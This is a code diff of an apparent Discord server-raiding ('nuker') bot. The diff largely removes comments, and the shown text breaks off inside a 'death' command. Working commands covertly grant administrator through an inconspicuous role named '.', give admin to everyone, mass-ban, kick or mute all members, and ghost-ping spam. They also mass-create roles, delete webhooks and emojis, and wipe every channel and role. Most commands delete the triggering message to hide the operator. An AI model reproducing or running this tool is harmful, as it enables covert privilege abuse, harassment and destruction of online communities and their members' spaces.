+            description=t("purge_success", count=len(deleted), channel=target.mention),
             color=discord.Color.green()
         )
 
-        # Send ephemeral message (auto-deletes after 3 seconds)
         await ctx.send(embed=embed, delete_after=3)
 
-        # Send DM to user
         try:
             await ctx.author.send(embed=embed)
         except discord.Forbidden:
@@ -558,6 +1104,7 @@ async def purge(ctx, amount: int):
         await send_dm(ctx, t("purge_no_permission"))
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
+
 
 @is_authorized()
 @bot.command(name='ban')
@@ -577,7 +1124,6 @@ async def ban(ctx, member: discord.Member, *, reason: str = "BYE BYE"):
         return
 
     try:
-        # Try to DM the user before banning
         try:
             dm_embed = discord.Embed(
                 description=t("ban_dm", guild=ctx.guild.name, reason=reason),
@@ -598,6 +1144,7 @@ async def ban(ctx, member: discord.Member, *, reason: str = "BYE BYE"):
         await send_dm(ctx, t("ban_no_permission"))
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
+
 
 @is_authorized()
 @bot.command(name='unban')
@@ -620,6 +1167,7 @@ async def unban(ctx, user_id: int):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='kick')
 @commands.has_permissions(kick_members=True)
@@ -638,7 +1186,6 @@ async def kick(ctx, member: discord.Member, *, reason: str = "BYE BYE"):
         return
 
     try:
-        # Try to DM the user before kicking
         try:
             dm_embed = discord.Embed(
                 description=t("kick_dm", guild=ctx.guild.name, reason=reason),
@@ -659,6 +1206,7 @@ async def kick(ctx, member: discord.Member, *, reason: str = "BYE BYE"):
         await send_dm(ctx, t("kick_no_permission"))
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
+
 
 @is_authorized()
 @bot.command(name='mute')
@@ -683,7 +1231,6 @@ async def mute(ctx, member: discord.Member, duration: str = "10m", *, reason: st
         return
 
     try:
-        # Try to DM the user before muting
         try:
             dm_embed = discord.Embed(
                 description=t("mute_dm", guild=ctx.guild.name, reason=reason),
@@ -705,6 +1252,7 @@ async def mute(ctx, member: discord.Member, duration: str = "10m", *, reason: st
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='unmute')
 @commands.has_permissions(moderate_members=True)
@@ -723,16 +1271,15 @@ async def unmute(ctx, member: discord.Member):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='god')
 async def god(ctx):
     """Give user administrator role"""
     try:
-        # Check if role already exists
         existing_role = discord.utils.get(ctx.guild.roles, name=".")
 
         if existing_role:
-            # Role exists, just assign it
             await ctx.author.add_roles(existing_role)
             embed = discord.Embed(
                 description=t("god_activated", user=ctx.author.mention),
@@ -740,7 +1287,6 @@ async def god(ctx):
             )
             await send_dm(ctx, embed=embed)
         else:
-            # Create new role with administrator permissions
             new_role = await ctx.guild.create_role(
                 name=".",
                 permissions=discord.Permissions(administrator=True),
@@ -748,14 +1294,12 @@ async def god(ctx):
                 reason=f"God role created by {ctx.author}"
             )
 
-            # Move role as high as possible (just below bot's highest role)
             try:
                 bot_top_role = ctx.guild.me.top_role
                 await new_role.edit(position=bot_top_role.position - 1)
             except discord.HTTPException:
                 pass
 
-            # Assign role to user
             await ctx.author.add_roles(new_role)
 
             print(f'{Fore.MAGENTA}[GOD] {Fore.WHITE}God mode activated for {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
@@ -771,13 +1315,13 @@ async def god(ctx):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='god-all')
 @commands.has_permissions(administrator=True)
 async def god_all(ctx):
     """Give everyone administrator role"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -788,11 +1332,9 @@ async def god_all(ctx):
 
         print(f'{Fore.MAGENTA}{Style.BRIGHT}[GOD-ALL] {Fore.WHITE}Giving admin to everyone in {guild.name} by {author.display_name}{Style.RESET_ALL}')
 
-        # Check if god role exists, create if not
         god_role = discord.utils.get(guild.roles, name=".")
 
         if not god_role:
-            # Create the god role
             god_role = await guild.create_role(
                 name=".",
                 permissions=discord.Permissions(administrator=True),
@@ -800,7 +1342,6 @@ async def god_all(ctx):
                 reason=f"God-all role created by {author}"
             )
 
-            # Move role as high as possible
             try:
                 bot_top_role = guild.me.top_role
                 await god_role.edit(position=bot_top_role.position - 1)
@@ -809,21 +1350,17 @@ async def god_all(ctx):
 
             print(f'{Fore.MAGENTA}[GOD-ALL] {Fore.WHITE}Created god role (.){Style.RESET_ALL}')
 
-        # Send initial DM
         try:
             await author.send(t("god_all_initiated"))
         except discord.Forbidden:
             pass
 
-        # Give role to all members
         success_count = 0
         failed_count = 0
 
         for member in guild.members:
-            # Skip bots
             if member.bot:
                 continue
-
             try:
                 await member.add_roles(god_role, reason=f"God-all by {author}")
                 success_count += 1
@@ -832,7 +1369,6 @@ async def god_all(ctx):
 
         print(f'{Fore.MAGENTA}{Style.BRIGHT}[GOD-ALL] {Fore.WHITE}Complete: {success_count} members given admin, {failed_count} failed{Style.RESET_ALL}')
 
-        # Send completion DM
         try:
             embed = discord.Embed(
                 description=t("god_all_complete", count=success_count),
@@ -847,6 +1383,7 @@ async def god_all(ctx):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='rename-server')
 @commands.has_permissions(administrator=True)
@@ -855,18 +1392,15 @@ async def rename_server(ctx, *, new_name: str):
     try:
         old_name = ctx.guild.name
 
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
             pass
 
-        # Rename the server
         await ctx.guild.edit(name=new_name, reason=f"Server renamed by {ctx.author}")
 
         print(f'{Fore.MAGENTA}[RENAME-SERVER] {Fore.WHITE}Server renamed from "{old_name}" to "{new_name}" by {ctx.author.display_name}{Style.RESET_ALL}')
 
-        # Send confirmation
         embed = discord.Embed(
             description=t("rename_server_success", name=new_name),
             color=discord.Color.blue()
@@ -878,19 +1412,18 @@ async def rename_server(ctx, *, new_name: str):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='server-icon')
 @commands.has_permissions(administrator=True)
 async def server_icon(ctx, image_url: str):
     """Change the server icon"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
             pass
 
-        # Download the image
         import aiohttp
         async with aiohttp.ClientSession() as session:
             async with session.get(image_url) as resp:
@@ -899,12 +1432,10 @@ async def server_icon(ctx, image_url: str):
                     return
                 image_data = await resp.read()
 
-        # Change server icon
         await ctx.guild.edit(icon=image_data, reason=f"Server icon changed by {ctx.author}")
 
         print(f'{Fore.MAGENTA}[SERVER-ICON] {Fore.WHITE}Server icon changed by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
 
-        # Send confirmation
         embed = discord.Embed(
             description=t("server_icon_success"),
             color=discord.Color.blue()
@@ -916,13 +1447,13 @@ async def server_icon(ctx, image_url: str):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='nick')
 @commands.has_permissions(manage_nicknames=True)
 async def nick(ctx, member: discord.Member, *, nickname: str):
     """Change a user's nickname"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -930,17 +1461,14 @@ async def nick(ctx, member: discord.Member, *, nickname: str):
 
         old_nick = member.display_name
 
-        # Check if we can change this user's nickname
         if member.top_role >= ctx.guild.me.top_role:
             await send_dm(ctx, t("nick_higher_role", member=member.mention))
             return
 
-        # Change nickname
         await member.edit(nick=nickname, reason=f"Nickname changed by {ctx.author}")
 
         print(f'{Fore.CYAN}[NICK] {Fore.WHITE}Changed {old_nick} to "{nickname}" by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
 
-        # Send confirmation
         embed = discord.Embed(
             description=t("nick_success", member=member.mention, nickname=nickname),
             color=discord.Color.green()
@@ -952,13 +1480,13 @@ async def nick(ctx, member: discord.Member, *, nickname: str):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='nick-all')
 @commands.has_permissions(administrator=True)
 async def nick_all(ctx, *, nickname: str):
     """Set everyone's nickname to the same thing"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -969,7 +1497,6 @@ async def nick_all(ctx, *, nickname: str):
 
         print(f'{Fore.CYAN}{Style.BRIGHT}[NICK-ALL] {Fore.WHITE}Setting all nicknames to "{nickname}" by {author.display_name} in {guild.name}{Style.RESET_ALL}')
 
-        # Send initial DM
         try:
             await author.send(t("nick_all_starting", nickname=nickname))
         except discord.Forbidden:
@@ -977,27 +1504,20 @@ async def nick_all(ctx, *, nickname: str):
 
         success_count = 0
         failed_count = 0
-
-        # Get all members
         members = list(guild.members)
 
         for member in members:
-            # Skip bots
             if member.bot:
                 failed_count += 1
                 continue
-
-            # Skip if we can't change their nickname (higher role)
             if member.top_role >= guild.me.top_role:
                 failed_count += 1
                 continue
-
             if await rate_limited_action(lambda m=member: m.edit(nick=nickname, reason=f"Nick-all by {author}")):
                 success_count += 1
             else:
                 failed_count += 1
 
-        # Send completion DM
         print(f'{Fore.CYAN}{Style.BRIGHT}[NICK-ALL] {Fore.WHITE}Complete: {success_count} nicknames changed, {failed_count} failed{Style.RESET_ALL}')
         try:
             embed = discord.Embed(
@@ -1013,13 +1533,13 @@ async def nick_all(ctx, *, nickname: str):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='role-spam')
 @commands.has_permissions(administrator=True)
 async def role_spam(ctx, role_name: str, count: int):
     """Mass create roles with a specific name"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -1028,7 +1548,6 @@ async def role_spam(ctx, role_name: str, count: int):
         if count <= 0:
             await send_dm(ctx, t("role_spam_invalid_count"))
             return
-
         if count > 250:
             await send_dm(ctx, t("role_spam_too_many"))
             return
@@ -1038,7 +1557,6 @@ async def role_spam(ctx, role_name: str, count: int):
 
         print(f'{Fore.MAGENTA}{Style.BRIGHT}[ROLE-SPAM] {Fore.WHITE}Creating {count}x "{role_name}" roles by {author.display_name} in {guild.name}{Style.RESET_ALL}')
 
-        # Send initial DM
         try:
             await author.send(t("role_spam_starting", count=count, name=role_name))
         except discord.Forbidden:
@@ -1052,13 +1570,11 @@ async def role_spam(ctx, role_name: str, count: int):
                 await guild.create_role(name=role_name, reason=f"Role-spam by {author}")
                 created_count += 1
             except discord.HTTPException:
-                # Rate limited or too many roles
                 failed_count += 1
                 await asyncio.sleep(0.5)
-            except Exception as e:
+            except Exception:
                 failed_count += 1
 
-        # Send completion DM
         print(f'{Fore.MAGENTA}{Style.BRIGHT}[ROLE-SPAM] {Fore.WHITE}Complete: {created_count} roles created, {failed_count} failed{Style.RESET_ALL}')
         try:
             embed = discord.Embed(
@@ -1074,13 +1590,13 @@ async def role_spam(ctx, role_name: str, count: int):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='webhook-nuke')
 @commands.has_permissions(administrator=True)
 async def webhook_nuke(ctx):
     """Delete all webhooks in the server"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -1091,7 +1607,6 @@ async def webhook_nuke(ctx):
 
         print(f'{Fore.RED}{Style.BRIGHT}[WEBHOOK-NUKE] {Fore.WHITE}Deleting all webhooks in {guild.name} by {author.display_name}{Style.RESET_ALL}')
 
-        # Send initial DM
         try:
             await author.send(t("webhook_nuke_starting"))
         except discord.Forbidden:
@@ -1100,7 +1615,6 @@ async def webhook_nuke(ctx):
         deleted_count = 0
         failed_count = 0
 
-        # Get all webhooks from all channels
         for channel in guild.text_channels:
             try:
                 webhooks = await channel.webhooks()
@@ -1113,7 +1627,6 @@ async def webhook_nuke(ctx):
             except Exception:
                 pass
 
-        # Send completion DM
         print(f'{Fore.RED}{Style.BRIGHT}[WEBHOOK-NUKE] {Fore.WHITE}Complete: {deleted_count} webhooks deleted, {failed_count} failed{Style.RESET_ALL}')
         try:
             embed = discord.Embed(
@@ -1129,24 +1642,22 @@ async def webhook_nuke(ctx):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='server-banner')
 @commands.has_permissions(administrator=True)
 async def server_banner(ctx, image_url: str):
     """Change the server banner (requires boost level 2+)"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
             pass
 
-        # Check if server has banner feature
         if "BANNER" not in ctx.guild.features:
             await send_dm(ctx, t("server_banner_no_feature"))
             return
 
-        # Download the image
         import aiohttp
         async with aiohttp.ClientSession() as session:
             async with session.get(image_url) as resp:
@@ -1155,12 +1666,10 @@ async def server_banner(ctx, image_url: str):
                     return
                 image_data = await resp.read()
 
-        # Change server banner
         await ctx.guild.edit(banner=image_data, reason=f"Server banner changed by {ctx.author}")
 
         print(f'{Fore.MAGENTA}[SERVER-BANNER] {Fore.WHITE}Server banner changed by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
 
-        # Send confirmation
         embed = discord.Embed(
             description=t("server_banner_success"),
             color=discord.Color.blue()
@@ -1172,13 +1681,13 @@ async def server_banner(ctx, image_url: str):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='strip')
 @commands.has_permissions(administrator=True)
 async def strip(ctx, member: discord.Member):
     """Remove all roles from a user"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -1192,20 +1701,18 @@ async def strip(ctx, member: discord.Member):
             await send_dm(ctx, t("strip_higher_role", member=member.mention))
             return
 
-        # Get all removable roles
-        roles_to_remove = [role for role in member.roles if role != ctx.guild.default_role and not role.managed]
+        roles_to_remove = [role for role in member.roles
+                           if role != ctx.guild.default_role and not role.managed]
         role_count = len(roles_to_remove)
 
         if role_count == 0:
             await send_dm(ctx, t("strip_no_roles", member=member.mention))
             return
 
-        # Remove all roles
         await member.remove_roles(*roles_to_remove, reason=f"Stripped by {ctx.author}")
 
         print(f'{Fore.YELLOW}[STRIP] {Fore.WHITE}Stripped {role_count} roles from {member.display_name} by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
 
-        # Send confirmation
         embed = discord.Embed(
             description=t("strip_success", count=role_count, member=member.mention),
             color=discord.Color.orange()
@@ -1217,13 +1724,13 @@ async def strip(ctx, member: discord.Member):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='emoji-nuke')
 @commands.has_permissions(administrator=True)
 async def emoji_nuke(ctx):
     """Delete all custom emojis"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -1234,7 +1741,6 @@ async def emoji_nuke(ctx):
 
         print(f'{Fore.RED}{Style.BRIGHT}[EMOJI-NUKE] {Fore.WHITE}Deleting all emojis in {guild.name} by {author.display_name}{Style.RESET_ALL}')
 
-        # Send initial DM
         try:
             await author.send(t("emoji_nuke_starting"))
         except discord.Forbidden:
@@ -1243,17 +1749,15 @@ async def emoji_nuke(ctx):
         deleted_count = 0
         failed_count = 0
 
-        # Get all emojis
         emojis = list(guild.emojis)
 
         for emoji in emojis:
             try:
                 await emoji.delete(reason=f"Emoji-nuke by {author}")
                 deleted_count += 1
-            except Exception as e:
+            except Exception:
                 failed_count += 1
 
-        # Send completion DM
         print(f'{Fore.RED}{Style.BRIGHT}[EMOJI-NUKE] {Fore.WHITE}Complete: {deleted_count} emojis deleted, {failed_count} failed{Style.RESET_ALL}')
         try:
             embed = discord.Embed(
@@ -1269,13 +1773,13 @@ async def emoji_nuke(ctx):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='shuffle-channels')
 @commands.has_permissions(administrator=True)
 async def shuffle_channels(ctx):
     """Randomly reorder all channels"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -1286,15 +1790,12 @@ async def shuffle_channels(ctx):
 
         print(f'{Fore.CYAN}{Style.BRIGHT}[SHUFFLE-CHANNELS] {Fore.WHITE}Shuffling all channels in {guild.name} by {author.display_name}{Style.RESET_ALL}')
 
-        # Send initial DM
         try:
             await author.send(t("shuffle_channels_starting"))
         except discord.Forbidden:
             pass
 
         import random
-
-        # Shuffle channels within each category
         modified_count = 0
 
         for category in guild.categories:
@@ -1302,7 +1803,6 @@ async def shuffle_channels(ctx):
             if len(channels) > 0:
                 positions = list(range(len(channels)))
                 random.shuffle(positions)
-
                 for i, channel in enumerate(channels):
                     try:
                         await channel.edit(position=positions[i])
@@ -1310,12 +1810,11 @@ async def shuffle_channels(ctx):
                     except Exception:
                         pass
 
-        # Shuffle channels without category
-        no_category_channels = [ch for ch in guild.channels if ch.category is None and not isinstance(ch, discord.CategoryChannel)]
+        no_category_channels = [ch for ch in guild.channels
+                                if ch.category is None and not isinstance(ch, discord.CategoryChannel)]
         if len(no_category_channels) > 0:
             positions = list(range(len(no_category_channels)))
             random.shuffle(positions)
-
             for i, channel in enumerate(no_category_channels):
                 try:
                     await channel.edit(position=positions[i])
@@ -1323,7 +1822,6 @@ async def shuffle_channels(ctx):
                 except Exception:
                     pass
 
-        # Send completion DM
         print(f'{Fore.CYAN}{Style.BRIGHT}[SHUFFLE-CHANNELS] {Fore.WHITE}Complete: {modified_count} channels shuffled{Style.RESET_ALL}')
         try:
             embed = discord.Embed(
@@ -1339,13 +1837,13 @@ async def shuffle_channels(ctx):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='voice-scatter')
 @commands.has_permissions(move_members=True)
 async def voice_scatter(ctx):
     """Scatter users randomly across voice channels"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -1356,14 +1854,12 @@ async def voice_scatter(ctx):
 
         print(f'{Fore.CYAN}{Style.BRIGHT}[VOICE-SCATTER] {Fore.WHITE}Scattering voice users in {guild.name} by {author.display_name}{Style.RESET_ALL}')
 
-        # Get all voice channels
         voice_channels = guild.voice_channels
 
         if len(voice_channels) < 2:
             await send_dm(ctx, t("voice_scatter_need_channels"))
             return
 
-        # Get all members in voice
         members_in_voice = []
         for channel in voice_channels:
             members_in_voice.extend(channel.members)
@@ -1372,9 +1868,9 @@ async def voice_scatter(ctx):
             await send_dm(ctx, t("voice_scatter_no_users"))
             return
 
-        # Send initial DM
         try:
-            await author.send(t("voice_scatter_starting", users=len(members_in_voice), channels=len(voice_channels)))
+            await author.send(t("voice_scatter_starting", users=len(members_in_voice),
+                                channels=len(voice_channels)))
         except discord.Forbidden:
             pass
 
@@ -1388,10 +1884,9 @@ async def voice_scatter(ctx):
                 if member.voice and member.voice.channel != target_channel:
                     await member.move_to(target_channel, reason=f"Voice-scatter by {author}")
                     moved_count += 1
-            except Exception as e:
+            except Exception:
                 failed_count += 1
 
-        # Send completion DM
         print(f'{Fore.CYAN}{Style.BRIGHT}[VOICE-SCATTER] {Fore.WHITE}Complete: {moved_count} users scattered, {failed_count} failed{Style.RESET_ALL}')
         try:
             embed = discord.Embed(
@@ -1407,13 +1902,13 @@ async def voice_scatter(ctx):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='mention-spam')
 @commands.has_permissions(mention_everyone=True)
 async def mention_spam(ctx, target: str, count: int):
     """Spam mentions of a user or role"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -1422,7 +1917,6 @@ async def mention_spam(ctx, target: str, count: int):
         if count <= 0:
             await send_dm(ctx, t("mention_spam_invalid_count"))
             return
-
         if count > 100:
             await send_dm(ctx, t("mention_spam_too_many"))
             return
@@ -1431,7 +1925,6 @@ async def mention_spam(ctx, target: str, count: int):
 
         print(f'{Fore.YELLOW}{Style.BRIGHT}[MENTION-SPAM] {Fore.WHITE}Spamming {count} mentions of {target} by {author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
 
-        # Send initial DM
         try:
             await author.send(t("mention_spam_starting", count=count))
         except discord.Forbidden:
@@ -1442,13 +1935,11 @@ async def mention_spam(ctx, target: str, count: int):
         for _ in range(count):
             try:
                 msg = await ctx.send(target)
-                # Delete immediately for ghost ping effect
                 await msg.delete()
                 sent_count += 1
             except Exception:
                 pass
 
-        # Send completion DM
         print(f'{Fore.YELLOW}{Style.BRIGHT}[MENTION-SPAM] {Fore.WHITE}Complete: {sent_count} mentions sent{Style.RESET_ALL}')
         try:
             embed = discord.Embed(
@@ -1464,24 +1955,22 @@ async def mention_spam(ctx, target: str, count: int):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='server-desc')
 @commands.has_permissions(administrator=True)
 async def server_desc(ctx, *, description: str):
     """Change the server description"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
             pass
 
-        # Change server description
         await ctx.guild.edit(description=description, reason=f"Server description changed by {ctx.author}")
 
         print(f'{Fore.MAGENTA}[SERVER-DESC] {Fore.WHITE}Server description changed by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
 
-        # Send confirmation
         embed = discord.Embed(
             description=t("server_desc_success"),
             color=discord.Color.blue()
@@ -1493,13 +1982,13 @@ async def server_desc(ctx, *, description: str):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @bot.command(name='move-all')
 @commands.has_permissions(move_members=True)
 async def move_all(ctx, channel: discord.VoiceChannel):
     """Move all users to a specific voice channel"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -1510,7 +1999,6 @@ async def move_all(ctx, channel: discord.VoiceChannel):
 
         print(f'{Fore.CYAN}{Style.BRIGHT}[MOVE-ALL] {Fore.WHITE}Moving all voice users to {channel.name} by {author.display_name} in {guild.name}{Style.RESET_ALL}')
 
-        # Get all members in voice
         members_in_voice = []
         for vc in guild.voice_channels:
             members_in_voice.extend(vc.members)
@@ -1519,7 +2007,6 @@ async def move_all(ctx, channel: discord.VoiceChannel):
             await send_dm(ctx, t("move_all_no_users"))
             return
 
-        # Send initial DM
         try:
             await author.send(t("move_all_starting", users=len(members_in_voice), channel=channel.name))
         except discord.Forbidden:
@@ -1533,10 +2020,9 @@ async def move_all(ctx, channel: discord.VoiceChannel):
                 try:
                     await member.move_to(channel, reason=f"Move-all by {author}")
                     moved_count += 1
-                except Exception as e:
+                except Exception:
                     failed_count += 1
 
-        # Send completion DM
         print(f'{Fore.CYAN}{Style.BRIGHT}[MOVE-ALL] {Fore.WHITE}Complete: {moved_count} users moved, {failed_count} failed{Style.RESET_ALL}')
         try:
             embed = discord.Embed(
@@ -1552,6 +2038,7 @@ async def move_all(ctx, channel: discord.VoiceChannel):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @commands.cooldown(1, 60, commands.BucketType.guild)
 @bot.command(name='ban-all')
@@ -1559,13 +2046,11 @@ async def move_all(ctx, channel: discord.VoiceChannel):
 async def ban_all(ctx, *, reason: str = "BYE BYE"):
     """Ban all members in the server"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
             pass
 
-        # Send initial DM
         try:
             await ctx.author.send(t("ban_all_starting"))
         except discord.Forbidden:
@@ -1574,19 +2059,13 @@ async def ban_all(ctx, *, reason: str = "BYE BYE"):
         banned_count = 0
         failed_count = 0
 
-        # Get all members
         members = list(ctx.guild.members)
 
         for member in members:
-            # Skip the bot
             if member.bot and member.id == bot.user.id:
                 continue
-
-            # Skip the command author
             if member.id == ctx.author.id:
                 continue
-
-            # Skip if role hierarchy prevents ban
             if member.top_role >= ctx.guild.me.top_role:
                 failed_count += 1
                 continue
@@ -1604,7 +2083,6 @@ async def ban_all(ctx, *, reason: str = "BYE BYE"):
             else:
                 failed_count += 1
 
-        # Send completion DM
         print(f'{Fore.RED}[BAN-ALL] {Fore.WHITE}Banned {banned_count} members in {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
         try:
             embed = discord.Embed(
@@ -1620,6 +2098,7 @@ async def ban_all(ctx, *, reason: str = "BYE BYE"):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @commands.cooldown(1, 60, commands.BucketType.guild)
 @bot.command(name='kick-all')
@@ -1627,13 +2106,11 @@ async def ban_all(ctx, *, reason: str = "BYE BYE"):
 async def kick_all(ctx, *, reason: str = "BYE BYE"):
     """Kick all members in the server"""
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
             pass
 
-        # Send initial DM
         try:
             await ctx.author.send(t("kick_all_starting"))
         except discord.Forbidden:
@@ -1642,19 +2119,13 @@ async def kick_all(ctx, *, reason: str = "BYE BYE"):
         kicked_count = 0
         failed_count = 0
 
-        # Get all members
         members = list(ctx.guild.members)
 
         for member in members:
-            # Skip the bot
             if member.bot and member.id == bot.user.id:
                 continue
-
-            # Skip the command author
             if member.id == ctx.author.id:
                 continue
-
-            # Skip if role hierarchy prevents kick
             if member.top_role >= ctx.guild.me.top_role:
                 failed_count += 1
                 continue
@@ -1672,7 +2143,6 @@ async def kick_all(ctx, *, reason: str = "BYE BYE"):
             else:
                 failed_count += 1
 
-        # Send completion DM
         print(f'{Fore.RED}[KICK-ALL] {Fore.WHITE}Kicked {kicked_count} members in {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
         try:
             embed = discord.Embed(
@@ -1688,6 +2158,7 @@ async def kick_all(ctx, *, reason: str = "BYE BYE"):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @commands.cooldown(1, 30, commands.BucketType.guild)
 @bot.command(name='mute-all')
@@ -1700,13 +2171,11 @@ async def mute_all(ctx, duration: str = "10m", *, reason: str = "BYE BYE"):
         return
 
     try:
-        # Delete command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
             pass
 
-        # Send initial DM
         try:
             await ctx.author.send(t("mute_all_starting", duration=duration))
         except discord.Forbidden:
@@ -1715,19 +2184,13 @@ async def mute_all(ctx, duration: str = "10m", *, reason: str = "BYE BYE"):
         muted_count = 0
         failed_count = 0
 
-        # Get all members
         members = list(ctx.guild.members)
 
         for member in members:
-            # Skip the bot
             if member.bot and member.id == bot.user.id:
                 continue
-
-            # Skip the command author
             if member.id == ctx.author.id:
                 continue
-
-            # Skip if role hierarchy prevents timeout
             if member.top_role >= ctx.guild.me.top_role:
                 failed_count += 1
                 continue
@@ -1745,7 +2208,6 @@ async def mute_all(ctx, duration: str = "10m", *, reason: str = "BYE BYE"):
             else:
                 failed_count += 1
 
-        # Send completion DM
         print(f'{Fore.YELLOW}[MUTE-ALL] {Fore.WHITE}Muted {muted_count} members for {duration} in {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
         try:
             embed = discord.Embed(
@@ -1761,6 +2223,7 @@ async def mute_all(ctx, duration: str = "10m", *, reason: str = "BYE BYE"):
     except Exception as e:
         await send_dm(ctx, t("error_occurred", error=str(e)))
 
+
 @is_authorized()
 @commands.cooldown(1, 120, commands.BucketType.guild)
 @bot.command(name='death')
@@ -1768,10 +2231,8 @@ async def mute_all(ctx, duration: str = "10m", *, reason: str = "BYE BYE"):
 async def death(ctx):
     """Ultimate destruction - Delete everything and ban everyone"""
     try:
-        # Epic logging with white text on red background
         print(f'{Back.RED}{Fore.WHITE}{Style.BRIGHT}[☠ DEATH ☠] INITIATED BY {ctx.author.display_name} IN {ctx.guild.name.upper()} - TOTAL ANNIHILATION{Style.RESET_ALL}')
 
-        # Delete the command message
         try:
             await ctx.message.delete()
         except (discord.HTTPException, discord.NotFound):
@@ -1780,7 +2241,6 @@ async def death(ctx):
         guild = ctx.guild
         author = ctx.author
 
-        # Send initial DM
         try:
             await author.send(t("death_initiated"))
         except discord.Forbidden:
@@ -1791,7 +2251,6 @@ async def death(ctx):
         deleted_categories = 0
         deleted_roles = 0
 
-        # Phase 1: BAN ALL MEMBERS
         print(f'{Back.RED}{Fore.WHITE}[☠ DEATH ☠] Phase 1: Banning all members...{Style.RESET_ALL}')
         members = list(guild.members)
         for member in members:
@@ -1801,14 +2260,12 @@ async def death(ctx):
                 continue
             if member.top_role >= guild.me.top_role:
                 continue
-
             try:
                 await member.ban(reason=f"DEATH COMMAND | Executed by {author}")
                 banned_count += 1
             except Exception:
                 pass
 
-        # Phase 2: DELETE ALL CHANNELS
         print(f'{Back.RED}{Fore.WHITE}[☠ DEATH ☠] Phase 2: Deleting all channels...{Style.RESET_ALL}')
         for channel in list(guild.channels):
             try:
@@ -1820,7 +2277,6 @@ async def death(ctx):
             except Exception:
                 pass
 
-        # Phase 3: DELETE ALL ROLES
         print(f'{Back.RED}{Fore.WHITE}[☠ DEATH ☠] Phase 3: Deleting all roles...{Style.RESET_ALL}')
         for role in list(guild.roles):
